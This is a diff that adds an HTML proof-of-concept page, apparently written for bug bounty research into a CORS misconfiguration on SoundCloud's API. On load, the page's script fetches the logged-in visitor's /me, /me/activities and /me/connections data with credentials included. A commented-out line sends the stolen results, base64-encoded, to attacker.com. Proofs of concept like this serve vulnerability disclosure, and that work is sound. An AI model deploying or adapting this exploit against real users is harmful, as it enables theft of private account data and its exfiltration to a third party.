@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>SoundCloud CORS PoC - Bug Bounty Research</title>
+</head>
+<body>
+<h2>CORS Misconfiguration PoC</h2>
+<pre id="output">Waiting...</pre>
+<script>
+const ENDPOINTS = [
+    "https://api-v2.soundcloud.com/me",
+    "https://api-v2.soundcloud.com/me/activities",
+    "https://api-v2.soundcloud.com/me/connections",
+];
+async function exploit() {
+    const results = {};
+    for (const url of ENDPOINTS) {
+        try {
+            const resp = await fetch(url, { credentials: "include" });
+            const data = await resp.json();
+            results[url] = { status: resp.status, data };
+        } catch(e) { results[url] = { error: e.toString() }; }
+    }
+    document.getElementById("output").textContent = JSON.stringify(results, null, 2);
+    // Send stolen data to attacker: fetch("https://attacker.com/?d="+btoa(JSON.stringify(results)));
+}
+exploit();
+</script>
+</body>
+</html>
